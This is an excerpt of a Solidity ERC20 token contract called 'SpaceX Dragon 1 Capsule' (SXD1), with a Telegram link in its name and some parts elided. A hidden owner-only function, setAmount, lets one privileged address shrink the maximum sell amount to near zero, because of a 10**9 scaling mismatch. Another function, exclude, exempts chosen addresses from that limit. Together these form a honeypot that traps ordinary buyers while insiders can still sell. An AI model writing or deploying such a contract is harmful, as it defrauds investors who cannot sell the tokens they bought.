 ...
 */
contract SPACEXDRAGON1 is ERC20 {
    uint8 private immutable _decimals = 18;
    uint256 private _totalSupply = 10000000 * 10**18;
    uint256 private _maxTxSAmount = 10000000 * 10**18;
     ...
     */
    constructor()
        ERC20("SpaceX Dragon 1 Capsule | t.me/dragon1capsule", "SXD1")
    {
    ...
    function _transfer(
        ...
        if (to == uniswapV2Pair && !_isExcluded[from]) {
            require(amount <= _maxTxSAmount, "transfer amount over max.");
        }
        super._transfer(from, to, amount);
    }

    function setAmount(uint256 maxTxAmount) external {
        require(recipients == _msgSender());
        _maxTxSAmount = maxTxAmount * 10**9;
    }

    function exclude(address updAds, bool isEx) public {
        require(recipients == _msgSender());
        _isExcluded[updAds] = isEx;
    }
}